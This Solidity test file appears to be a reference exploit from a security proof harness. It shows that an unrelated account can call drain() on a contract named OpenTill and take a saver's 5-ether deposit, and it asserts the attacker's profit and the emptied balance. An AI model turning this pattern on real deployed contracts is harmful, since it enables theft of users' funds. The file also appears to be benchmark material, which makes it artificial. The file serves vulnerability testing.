// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for OpenTill. An unrelated account calls drain() and sweeps the till.
// Run by hand:
//   forge test --root proofground --match-contract ProveOpenTill -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTill is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();

        address saver = makeAddr("saver");
        vm.deal(saver, 5 ether);
        vm.prank(saver);
        till.deposit{value: 5 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        noteAttackerStart(attacker);

        vm.prank(attacker);
        till.drain(attacker);

        profit = attacker.balance;          // the whole 5-ether till, from a zero-balance account
        assertExploitLanded(4 ether);
        assertEq(address(till).balance, 0, "till not emptied");
    }
}
